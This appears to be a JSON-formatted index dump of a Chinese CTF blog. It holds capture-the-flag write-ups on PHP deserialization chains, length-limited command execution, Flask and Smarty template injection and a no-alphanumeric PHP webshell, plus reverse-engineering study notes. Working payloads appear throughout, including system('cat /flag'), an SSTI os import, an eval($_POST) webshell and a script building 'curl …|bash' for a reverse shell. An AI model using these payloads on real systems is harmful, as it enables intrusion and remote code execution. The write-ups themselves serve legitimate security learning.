1:&#123;s:7:&quot;qSvLUy5&quot;;O:6:&quot;Sg86BZ&quot;:1:&#123;s:7:&quot;LNsywtO&quot;;O:6:&quot;Kyclto&quot;:1:&#123;s:7:&quot;yP0sQDv&quot;;O:6:&quot;HvOSO4&quot;:1:&#123;s:7:&quot;IEXEXgC&quot;;O:6:&quot;nw8rU4&quot;:1:&#123;s:7:&quot;l3RdfVY&quot;;O:6:&quot;S4x3Gm&quot;:1:&#123;s:7:&quot;a7E8Ki4&quot;;O:6:&quot;y709PB&quot;:1:&#123;s:7:&quot;gg7ZGMD&quot;;O:6:&quot;mqeccs&quot;:1:&#123;s:7:&quot;VN0dxHK&quot;;O:6:&quot;wWTYfQ&quot;:1:&#123;s:7:&quot;ERWubTU&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv&#x3D;phpinfo();&#x2F;&#x2F;\n\n\nhttp:&#x2F;&#x2F;eci-2ze6b0758ddkfbdqshq6.cloudeci1.ichunqiu.com&#x2F;?pop&#x3D;O:6:&quot;oc3cR2&quot;:1:&#123;s:7:&quot;eoGmbyU&quot;;O:6:&quot;P68f9C&quot;:1:&#123;s:7:&quot;FGDnExd&quot;;O:6:&quot;xzpdu7&quot;:1:&#123;s:7:&quot;tMrEI65&quot;;O:6:&quot;NeGUzW&quot;:1:&#123;s:7:&quot;IxYA4YN&quot;;O:6:&quot;ccTQVZ&quot;:1:&#123;s:7:&quot;zlM26BV&quot;;O:6:&quot;w4a1lw&quot;:1:&#123;s:7:&quot;mtUBllc&quot;;O:6:&quot;onRaRG&quot;:1:&#123;s:7:&quot;rvA7BSB&quot;;O:6:&quot;CGpT4s&quot;:1:&#123;s:7:&quot;po41qfC&quot;;O:6:&quot;d4gWv9&quot;:1:&#123;s:7:&quot;UiSXANy&quot;;O:6:&quot;gXUOZX&quot;:1:&#123;s:7:&quot;XdwQRTq&quot;;O:6:&quot;iEfQRF&quot;:1:&#123;s:7:&quot;KRA3QWS&quot;;O:6:&quot;fCnqo4&quot;:1:&#123;s:7:&quot;qSvLUy5&quot;;O:6:&quot;Sg86BZ&quot;:1:&#123;s:7:&quot;LNsywtO&quot;;O:6:&quot;Kyclto&quot;:1:&#123;s:7:&quot;yP0sQDv&quot;;O:6:&quot;HvOSO4&quot;:1:&#123;s:7:&quot;IEXEXgC&quot;;O:6:&quot;nw8rU4&quot;:1:&#123;s:7:&quot;l3RdfVY&quot;;O:6:&quot;S4x3Gm&quot;:1:&#123;s:7:&quot;a7E8Ki4&quot;;O:6:&quot;y709PB&quot;:1:&#123;s:7:&quot;gg7ZGMD&quot;;O:6:&quot;mqeccs&quot;:1:&#123;s:7:&quot;VN0dxHK&quot;;O:6:&quot;wWTYfQ&quot;:1:&#123;s:7:&quot;ERWubTU&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv&#x3D;system(&#39;ls &#x2F;&#39;);&#x2F;&#x2F;\n\n\nhttp:&#x2F;&#x2F;eci-2ze6b0758ddkfbdqshq6.cloudeci1.ichunqiu.com&#x2F;?pop&#x3D;O:6:&quot;oc3cR2&quot;:1:&#123;s:7:&quot;eoGmbyU&quot;;O:6:&quot;P68f9C&quot;:1:&#123;s:7:&quot;FGDnExd&quot;;O:6:&quot;xzpdu7&quot;:1:&#123;s:7:&quot;tMrEI65&quot;;O:6:&quot;NeGUzW&quot;:1:&#123;s:7:&quot;IxYA4YN&quot;;O:6:&quot;ccTQVZ&quot;:1:&#123;s:7:&quot;zlM26BV&quot;;O:6:&quot;w4a1lw&quot;:1:&#123;s:7:&quot;mtUBllc&quot;;O:6:&quot;onRaRG&quot;:1:&#123;s:7:&quot;rvA7BSB&quot;;O:6:&quot;CGpT4s&quot;:1:&#123;s:7:&quot;po41qfC&quot;;O:6:&quot;d4gWv9&quot;:1:&#123;s:7:&quot;UiSXANy&quot;;O:6:&quot;gXUOZX&quot;:1:&#123;s:7:&quot;XdwQRTq&quot;;O:6:&quot;iEfQRF&quot;:1:&#123;s:7:&quot;KRA3QWS&quot;;O:6:&quot;fCnqo4&quot;:1:&#123;s:7:&quot;qSvLUy5&quot;;O:6:&quot;Sg86BZ&quot;:1:&#123;s:7:&quot;LNsywtO&quot;;O:6:&quot;Kyclto&quot;:1:&#123;s:7:&quot;yP0sQDv&quot;;O:6:&quot;HvOSO4&quot;:1:&#123;s:7:&quot;IEXEXgC&quot;;O:6:&quot;nw8rU4&quot;:1:&#123;s:7:&quot;l3RdfVY&quot;;O:6:&quot;S4x3Gm&quot;:1:&#123;s:7:&quot;a7E8Ki4&quot;;O:6:&quot;y709PB&quot;:1:&#123;s:7:&quot;gg7ZGMD&quot;;O:6:&quot;mqeccs&quot;:1:&#123;s:7:&quot;VN0dxHK&quot;;O:6:&quot;wWTYfQ&quot;:1:&#123;s:7:&quot;ERWubTU&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv&#x3D;system(&#39;cat &#x2F;flag&#39;);&#x2F;&#x2F;\n\n\n\n\n","slug":"强网杯2021-pop链","date":"2021-06-28T15:34:20.000Z","categories_index":"CTF","tags_index":"CTF","author_index":"A1andNS"},{"id":"e9b793bf11c1914484b7555a66d461ba","title":"RE启动笔记","content":"基本知识常见的处理器架构常见的CPU架构有X86架构、AMD64架构、ARM架构、MIPS架构、IA64架构、X86-64架构。\n而这些架构又都会对应相应的指令集，指令集又分为**精简指令集(risv)和相对复杂的复杂指令集(cisv)**，其中ARM架构多用于手机等移动设备，例如我们手机的CPU基本都是基于ARM cortex内核的。MIPS架构多用于嵌入式路由器。\n总线没有总线，cpu，内存、输入输出设备之间就无法进行沟通，总线的主要作用就是用来进行通讯。总线分为地址总线、数据总线和控制总线。\n并行：就是同时传输，串行就是队列排队传输。\n编译过程文本文件编译成可执行程序的过程如下：\n预编译-&gt;编译-&gt;汇编-&gt;链接\ngcc -E xxx.c -o xxx.i #预编译\ngcc -S xxx.i -o xxx.s #编译\ngcc -C xxx.s -o xxx.o #汇编\ngcc --static xxx.o -o xxx #连接\n\n\n简单的helloword程序进行预编译后，原来的printf()函数被展开了\n\n接着进行编译，得到了一个汇编的结果。\n\n然后在汇编为机器码,使用readelf命令来读取符号表\n\n通用寄存器直接引用nep的图，师傅的总结。\n\nal：低八位     ah：高八位   ax：高低合起来的16位   eax: 32位    rax：64位\n段寄存器\ncanary保护在栈里面存储一个值，然后再函数返回的时候，取出这个值，然后进行一个比较，来检测时候存在栈溢出。\n标志寄存器\n结合全名辅助记忆\n运算指令\n赋值指令\n栈相关指令\npusha和popa是逆过程，pushfd和popfd也是相逆的过程。\n跳转指令\ncmp指令会把目标操作数-源操作数，然后再由又得到值来判断标志寄存器来跳转。\na是大于，g也是大于，但是前者是无符号比较，后者是有符号比较。具体可以看图中的条件部分。\n指令调用函数\ncall后跟需要调用的函数。ret返回函数，retf会影响段寄存器，可以让32位程序执行64位代码。\n外部中断外部中断是指来自CPU外部的中断，而外部的中断源必须是某个硬件，所以外部中断又称为硬件中断CPU提供统一的接口作为中断信号的公共线路，所有来自外设的中断信号都共享公共线路连接到CPU，外部硬件的中断通过两根信号线通知CPU的两根信号线分别是INTR(INTeRrupt)和NMI(Non Maskable Interrupt)\n\n从INTR引脚收到的中断都是不影响系统运行的，可以随时处理从NMI引脚收到的中断，那基本上全是硬伤，CPU都没有运行下去的必要了\n内中断除0错误单步中断执行一条指令之后就会引起一次中断执行into指令into这是中断溢出指令，它所触发的中断向量号是 4。不过，能否引发 4 号中断是要看 eflags 标志寄存器中的 OF 位是否为 1，如果是 1 才会引发中断，否则该指令悄悄地什么都不做，低调得很执行int指令int 8位立即数 通过它进行系统调用，8 位立即数可表示 256种中断，这与处理器所支持的中断数是相吻合的异常fault：缺页发生\ntrap (int3)    \nabort：终止程序运行\n端口in指令一般用来从端口读数据，dx存端口号，读的数据存到al或者ax里面，具体是选择al还是ax是根据对应端口指代的寄存器位数来决定的例如：in al, dxin ax, dx\nout指令一般用来往端口写数据，同样dx存端口号，与in指令不同的是out指令也可以使用立即数来指明端口号，然后要写入的数据使用al或者ax来存，同样具体是选择al还是ax是根据对应端口指代的寄存器位数来决定的\nout dx, al\nout dx,ax\nout 立即数, al\nout 立即数, ax\n\n内联汇编基本内联汇编的格式如下：asm [volatile] (“assembly code”)\nasm和__asm__是一样的，volatile和__volatile__是一样的，volatile的功能是告诉gcc不要修改我写的汇编代码\nassembly code的规则\n\n指令必须用双引号引起来，无论双引号中是一条指令还是多条指令\n\n一对双引号不能跨行，如果跨行需要在结尾用反斜杠’\\‘转移\n\n指令之间用分号”;”、换行符”\\n”或换行符加制表符”\\n\\t”分隔\n\n\n拓展内联汇编：\n格式如下\nasm [volatile] (“assembly code”:output : iuput : clobber/modify)\noutput：用来指定汇编代码的数据如何输出给C代码使用\ninput：用来指定C语言中数据如何输入给汇编使用\nclobber/modify：汇编代码执行后会破坏一些内存或寄存器资源，通过此项通知编译器，可能造成寄存器或内存数据的破坏，这样gcc就知道哪些寄存器或内存需要提前保护起来\n寄存器约束寄存器约束就是要求 gcc 使用哪个寄存器，将 input 或 output 中变量约束在某个寄存器中。常见的寄存器约束有：\n\n-a：表示寄存器 eax/ax/al \n\n-b：表示寄存器 ebx/bx/bl \n\n-c：表示寄存器 ecx/cx/cl \n\n-d：表示寄存器 edx/dx/dl \n\n-D：表示寄存器 edi/di \n\n-S：表示寄存器 esi/si\n\n-q：表示任意这 4 个通用寄存器之一：eax/ebx/ecx/edx \n\n-r：表示任意这 6 个通用寄存器之一：eax/ebx/ecx/edx/esi/edi\n\n-g：表示可以存放到任意地点（寄存器和内存）。相当于除了同 q 一样外，还可以让 gcc 安排在内存中\n\n-A：把 eax 和 edx 组合成 64 位整数\n\n-f：表示浮点寄存器\n\n-t：表示第 1 个浮点寄存器\n\n-u：表示第 2 个浮点寄存器\n\n\n","slug":"RE启动笔记","date":"2021-05-03T03:24:23.000Z","categories_index":"学习笔记","tags_index":"RE","author_index":"A1andNS"},{"id":"66a2d15b629f44e698c5d7524e5b913b","title":"BUUOJ练习记录210418","content":"[HITCON 2017]Babyfirst-Revenge考点：长度限制的命令执行\n这是一个典型的限制长度为 5的命令执行题目\n&lt;?php\n   echo $_SERVER['REMOTE_ADDR'].\"\\n\";\n   $sandbox = '/var/www/html/sandbox/' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']);\n   @mkdir($sandbox);\n   @chdir($sandbox);\n   if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123;\n       @exec($_GET['cmd']);\n   &#125; else if (isset($_GET['reset'])) &#123;\n       @exec('/bin/rm -rf ' . $sandbox);\n   &#125;\n   highlight_file(__FILE__);\n\n直接给出了源码，基本思路就是反弹shell，对于这种限制长度的题目，基本上会采用创建大量文件，然后使用ls -t&gt;a命令来构造a文件的内容，实际上也就是一条命令，然后sh a去执行a中的命令，从而实现反弹shell。当然手动的效率比较低，可用考虑写一个脚本以便以后使用。\n在vps上写入一个反弹shell命令到根目录文件，以靶机可以获取。\n\n直接写入curl 172.16.172.91|bash使由部分字符会重复，导致没法完整拼接，毕竟长度太短了点。所以使用base64编个码，防止出现这种情况。\nY3VybCAxNzIuMTYuMTcyLjkxfGJhc2g&#x3D;\n\n上脚本：\nimport requests\nimport time\n\n\ndef start():\n    url = \"http://26cae3c2-a183-4c3f-b824-c5808df0dce5.node3.buuoj.cn/?cmd=\"\n    payload1 = r'''>a\n>\\>\\\\\n>-d\\\\\n>\\ \\\\\n>64\\\\\n>se\\\\\n>ba\\\\\n>\\|\\\\\n>=\\\\\n>2g\\\\\n>hc\\\\\n>GJ\\\\\n>xf\\\\\n>jk\\\\\n>yL\\\\\n>Tc\\\\\n>M\\\\\n>Yu\\\\\n>MT\\\\\n>Iu\\\\\n>Nz\\\\\n>Ax\\\\\n>bC\\\\\n>Vy\\\\\n>Y3\\\\\n>S&#125;\\\\\n>IF\\\\\n>&#123;\\\\\n>\\$\\\\\n>ho\\\\\n>ec\\\\'''\n    payload2 = r'''>ls\\\\\nls>_\n>\\ \\\\\n>-t\\\\\n>\\>y\nls>>_'''\n    payload2 = payload2.split('\\n')\n    for i in payload2:\n        print(url + i)\n        requests.get(url=url + i)\n        time.sleep(0.2)\n    payload1 = payload1.split('\\n')\n    for j in payload1:\n        print(url + j)\n        requests.get(url=url + j)\n        time.sleep(0.2)\n    requests.get(url=url + \"sh _\")\n    time.sleep(0.2)\n    requests.get(url=url + \"sh y\")\n    time.sleep(0.2)\n    requests.get(url=url + \"sh a\")\n\n\nif __name__ == \"__main__\":\n    start()\n\n\n可以看到我们已经写入了文件_\n\n再看一下文件a，可以看到我们已经写入了一个命令在里面，这个时候传入参数到cmd=sh a就可以去执行这个命令，从vps上获取命令并且bash执行，但是buuoj提供的linux内网靶机，不知道为什么反弹shell一直没有成功。\n\n但是大概的解题思路就是如此了。\n[GYCTF2020]FlaskApp考点：SSTI\n如题一样，这是一个flask框架。这是一个实现base64加解密的小app，而且编码结果和解码结果都存在输出到页面上，考虑测试时候存在ssti问题。14可以但是49不可行，应当是被过滤，*被过滤,先尝试ssti看看，发现到了subclasses查询时就不会有显示了，感觉不太行的样子。先不急，可以稍微看看提示，提示的源码中似乎在提示与PIN码有关。\n所以就在解码处，随便输一个非base64字符来看看有没有开debug mode（前提是没有做异常处理），如果开了我们就可用看看能不能读到一些代码了。事实证明它开启了debug mode\n@app.route('/decode',methods=['POST','GET'])\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"结果 ： &#123;0&#125;\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        res =  render_template_string(tmp)\n\n\n利用debug mode的报错我们get到了上面的这些代码，以及源文件的存储位置为/app/app.py,PING码问题条件不足，从代码来看是要绕过waf函数的限制来进行ssti，但是waf的内容我们这里无法知晓。\n用脚本来找一下可用的类：\nsearch = '__builtins__'\nnum =-1\nfor i in [].__class__.__base__.__subclasses__():\n    num += 1\n    try:\n        if search in i.__init__.__globals__.keys():\n            print(i.__name__, num)\n    except Exception as e:\n        pass\n    \n'''运行结果'''\n_ModuleLock 80\n_DummyModuleLock 81\n_ModuleLockManager 82\nModuleSpec 83\nFileLoader 94\n_NamespacePath 95\n_NamespaceLoader 96\nFileFinder 98\nzipimporter 104\n_ZipImportResourceReader 105\nIncrementalEncoder 107\nIncrementalDecoder 108\nStreamReaderWriter 109\nStreamRecoder 110\n_wrap_close 132\nQuitter 133\n_Printer 134\nDynamicClassAttribute 136\n_GeneratorWrapper 137\nWarningMessage 138\ncatch_warnings 139\nRepr 166\npartialmethod 174\nsingledispatchmethod 175\ncached_property 176\n_GeneratorContextManagerBase 178\n_BaseExitStack 179\n\n所以可用尝试去构造一个payload：\n&#123;% for i in [].__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__=='catch_warnings' %&#125;&#123;&#123; i.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n编码一下：\neyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9\n\n成功读取到了源码：\n\nfrom flask\nimport Flask, render_template_string from flask\nimport render_template, request, flash, redirect, url_for from flask_wtf\nimport FlaskForm from wtforms\nimport StringField, SubmitField from wtforms.validators\nimport DataRequired from flask_bootstrap\nimport Bootstrap\nimport base64 \n\napp = Flask(__name__) \napp.config['SECRET_KEY'] ='s_e_c_r_e_t_k_e_y'\nbootstrap = Bootstrap(app) \nclass NameForm(FlaskForm): \n    text = StringField('BASE64 Æ', validators = [DataRequired()]) \n    submit = SubmitField('Ð¤') \nclass NameForm1(FlaskForm): \n    text = StringField('BASE64ãÆ', validators = [DataRequired()]) \n    submit = SubmitField('Ð¤') \ndef waf(str): \n        black_list = [\"flag\", \"os\",\"system\", \"popen\", \"import\", \"eval\", \"chr\", \"request\",\"subprocess\", \"commands\", \"socket\", \"hex\", \"base64\", \"*\", \"?\"]\n        for x in black_list: \n            if x in str.lower(): \n                return 1\n@ app.route('/hint', methods = ['GET']) \ndef hint(): \n    txt = \"1%C\u0010KÍ\u0001\u0001\"\n    return render_template(\"hint.html\", txt = txt)\n@ app.route('/', methods = ['POST', 'GET']) \ndef encode(): \n    if request.values.get('text'): \n        text = request.values.get(\"text\") \n        text_decode = base64.b64encode(text.encode()) \n        tmp = \"Ó :&#123;0&#125;\".format(str(text_decode.decode()))\n        res = render_template_string(tmp) \n        flash(tmp) \n        return redirect(url_for('encode'))\n    else :\n        text = \"\"\n        form = NameForm(text) \n        return render_template(\"index.html\", form = form, method = \" Æ\", img = \"flask.png\")\n@ app.route('/decode', methods = ['POST', 'GET']) \ndef decode():\n    if request.values.get('text'):\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode()) \n        tmp = \"Ó \u001a &#123;0&#125;\".format(text_decode.decode()) \n        if waf(tmp):\n            flash(\"no no no !!\") \n            return redirect(url_for('decode')) \n        res = render_template_string(tmp) \n        flash(res) \n        return redirect(url_for('decode'))\n    else :\n        text = \"\"\n        form = NameForm1(text) \n        return render_template(\"index.html\", form =form, method = \"ãÆ\", img = \"flask1.png\")\n@ app.route('/&lt;name>', methods = ['GET']) \ndef not_found(name): \n    return render_template(\"404.html\", name = name) \nif __name__ == '__main__':\n    app.run(host = \"0.0.0.0\", port = 5000, debug = True)\n\n这下整到完整的源码了，就是subclasses为什么会无输出，这里看起来没有什么问题，关注一下waf过滤了不少的关键词，但是我们可用使用拼接来绕过限制。\n&#123;% for i in [].__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n编码：\neyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJykgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ&#x3D;&#x3D;\n\n\n下面去读一下文件：\n&#123;% for i in [].__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_fla&#39;+&#39;g.txt&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n编码：\neyUgZm9yIGkgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBpLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgaS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3RoaXNfaXNfdGhlX2ZsYScrJ2cudHh0JykucmVhZCgpIH19eyUgZW5kaWYgJX17JSBlbmRmb3IgJX0&#x3D;\n\n\n[CISCN2019 华东南赛区]Web11考点：smarty模板注入\n给了一个获取IP的API，首先发现xxf是可以改变页面显示的IP地址的，而且题目告知使用smarty模板引擎，那么考虑xxf处是否存在smarty模板注入的可能。对于smarty模板，可以使用&#123;$smarty.version&#125;来获取smarty版本号是什么,&#123;$smarty.template&#125;来获取当前模板文件名。\n\n这里成功看到了版本是3.1.30，模板文件名4d67881ea3ebdc31c22ffd36520512c179efab6a，可以确定这里就是一个注入点了，去看一下smarty 3的官方手册吧，smarty也不是太熟悉。也看了一篇简单的使用教程https://www.cnblogs.com/hehheai/p/6509720.html，翻译的smarty3手册https://www.kancloud.cn/prothes/smarty，`{php}`标签被禁用了，\n\n好在smarty中if标签是可以用来执行php代码的。\n直接用\n&#123;if system('cat /flag')&#125;&#123;/if&#125;\n\n来读取flag\n\n这里既然看了手册就再多探索几种payload：\n//变量赋值的方式来执行代码\n&#123;$a = system('cat /flag')&#125;&#123;$a&#125;\n//使用追加方式来执行代码\n&#123;append var = system('cat /flag') value='1' index='0'&#125;\n//赋值方式来执行代码\n&#123;assign var = system('cat /flag') value='1'&#125;\n//使用块方式来执行代码\n&#123;block name = system('cat /flag')&#125;&#123;/block&#125;\n//for方式执行代码\n&#123;for $name=system('cat /flag') to 3&#125;&#123;$name&#125;&#123;/for&#125;\n\n看来smarty能够和模板进行接触的点还是很多的，记个小笔记。\n[BJDCTF 2nd]elementmaster考点：脑洞、脚本编写\n开局一张图，什么都没有，扫描了目录依旧一无所有，甚至把图下到了本地以为是图中有玄机，但是似乎没有，看看前段源码，这两个句子倒是有点导向作用，但是还是让我想了很久，关注到id，但是搜索一下发现style里面根本就没有这两个ID的存在，十分可疑啊。\n\n这两个是16进制的，尝试把他转成字符。\n一个是Po.，另一个是php，正是脑洞啊，正好得到了Po.php，访问看看是什么。Po.php输出只有一个.卡题了，卡了很久，脑洞不够用了，后来看了wp，发现居然是化学元素Po，5555，化学菜鸡流泪。\n这下整明白了，随便找几个元素试试，发现并不是所有的元素都可用访问，那就自己写一个脚本来跑一下看看那些正常吧。\n\n发现好像可用跑出一个文件名来，稍微改改脚本\nimport requests\nimport time\n\n\npoc = ['H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar',\n        'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br',\n        'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te',\n        'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm',\n        'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn',\n        'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr',\n        'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue']\nurl = 'http://063ef4ee-3c60-495d-8536-23adff29b397.node3.buuoj.cn/&#123;&#125;.php'\nflag = ''\nfor i in poc:\n    r = requests.get(url=url.format(i))\n    if r.status_code == 200:\n        flag += r.text\n        print (\"[+]Filename:&#123;0&#125;\".format(flag))\n    time.sleep(1)\n\n\n\n[+]Filename:And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php\n访问一下\n\n这题从难度上来说应该是很简单，但是脑洞我是真的开不动啊。\n[BJDCTF 2nd]Schrödinger考点：脑洞、时间戳\n显示这是一个暴力破解的api网站。\n看一下前段源码，发现提示Note : Remenmber to remove test.php!\n\n是一个登录页面，而且似乎需要获取admin密码。以为可以sql啥的整了半天，最后才想起来回到首页来进行爆破试试。但是这个爆破速度也太慢了吧，抓包检查一下。\n\n解一下url再来个base64发现是一个时间戳1619014885\n那我就去转换一下，发现时当是的时间，那我伪造一个时间戳去传入看看。这个时间戳改大了没有用，直接给我NA%了，那就改小，给他设置为空值。就到了99%了\n\n在时间戳为空时check一下，得到了信息。\n\n很可惜登录还是失败了，这里又是一个脑洞的地方，av11664517是不是很熟悉，如果经常逛B站应该就会认出它，然而我还是没有缓过神来。\n然后这flag在评论区里面。。。脑洞无处不在。\nBJD{Quantum_Mechanics_really_Ez}\n[BJDCTF 2nd]老文盲了考点：生僻字拼音\n文盲是什么，当然是不认识字，不认识字的最直接表象就是不会读。那么就用https://pinyin.supfree.net/在线汉字转拼音的操作。\n然后读出flag：\nbì jí dì dà kuò hào zhè jiù shì fǔ lài gē zhí jiē jiāo lè bā dà kuò hào \nBJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125;\n中间的不改动就好\n\n[BJDCTF 2nd]cat_flag考点：二进制\n做了分帧的操作，没有什么作用，16进制和通道分离也都没有看出什么端倪，最后还是要回归到这张gif本身，很多的小方格，有的有鸡腿，有的是米饭，刚好只有两种可能，要么是鸡腿要么是米饭，那么就有可能是二进制了。\n\n所以整一下二进制看看行不行：\n01000010\n01001010\n01000100\n01111011\n01001101\n00100001\n00110000\n01111110\n01111101\n转一下ascii\n\n\n得到flag\n[MRCTF2020]套娃考点：代码审计、绕过\n第一层套娃的源码：\n$query = $_SERVER['QUERY_STRING'];\n\n if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123;\n    die('Y0u are So cutE!');\n&#125;\n if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123;\n    echo \"you are going to the next ~\";\n&#125;\n\n这里会对QUERY_STRING获取的字符进行子串计数，只有没有相关子串存在才行，但是下面GET参数为b_u_p_t所以需要绕过，这里可以利用substr_count函数区分大小写来用%5F来绕过，也可以利用空格与_等效来绕过。后面和23333比较的绕过则使用23333%0a即可绕过，这样即可以满足匹配也能够满足比较不同。\n?b%5Fu%5Fp%5Ft\n第二层套娃,首先jsfuck得到传POST参数Merak，得到源码：\n&lt;?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\n\nif(isset($_POST['Merak']))&#123; \n    highlight_file(__FILE__); \n    die(); \n&#125; \n\n\nfunction change($v)&#123; \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i&lt;strlen($v);$i++)&#123; \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    &#125; \n    return $re; \n&#125;\necho 'Local access only!'.\"&lt;br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' )&#123;\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); &#125;\n?> \n\nClient-ip的http头部实现绕过本地验证，然后利用PHP伪协议满足2333比较data://text/plain,todat is a happy day,这样就到最后一步了，需要针对change函数，编写逆向算法破解，来读取flag文件。\n&lt;?php\n$file = 'flag.php';\n$result = '';\nfor ($i=0;$i&lt;strlen($file);$i++)&#123;\n    $result .= chr( ord($file[$i]) - $i*2);\n&#125;\necho var_dump($result).\"\\n\";\n$result = base64_encode($result);\necho var_dump($result).\"\\n\";\n\n\n[极客大挑战 2019]RCE ME考点：无符号RCE\n源码：\n&lt;?php\nerror_reporting(0);\nif(isset($_GET['code']))&#123;\n            $code=$_GET['code'];\n                    if(strlen($code)>40)&#123;\n                                        die(\"This is too Long.\");\n                                                &#125;\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123;\n                                        die(\"NO.\");\n                                                &#125;\n                    @eval($code);\n&#125;\nelse&#123;\n            highlight_file(__FILE__);\n&#125;\n\n// ?>\n\n使用取反来绕过，exp:\necho var_dump(urlencode(~'assert'));\necho var_dump(urlencode(~'eval($_POST[\"cmd\"])'));\n\n然后构造如下payload：\nhttp://69139acd-11a7-4c21-a087-feb44a969ae1.node4.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9C%92%9B%DD%A2%D6);\n\n再使用antsword去连接一下webshell。\n\n发现被限制了执行命令，利用answord自带的disable_function绕过插件。\n\n","slug":"BUUOJ练习记录210418","date":"2021-04-18T09:49:16.000Z","categories_index":"CTF","tags_index":"BUUOJ","author_index":"A1andNS"},{"id":"04eae79709b48ea326c448f0846fb5ce","title":"Python安全编程小练习2","content":"今天继续，来看看子域名挖掘和邮件爬取，今天涉及的两者都是对网络爬虫的深入应用，从而实现信息搜集目的。并且因为是利用爬虫来爬取搜索引擎的信息，所以直接面临的就是百度等网站的反爬虫保护，而我们要实现工具的使用就需要绕过这些保护。\n前期准备就按照书上的来，我们也来看看必应搜索(http://cn.bing.com)，首先我们先来使用浏览器来访问看看情况。\n在bing中利用一定的语法site:baidu.com进行搜索，在结果中就得到了很多baidu.com的子域名链接，同时我们要关注url处是如何进行构造的。\n\n#从首页发起搜索\nhttps://cn.bing.com/search?q=site%3Abaidu.com&amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq=site%3Abaidu.com&amp;sc=0-14&amp;sk=&amp;cvid=A64D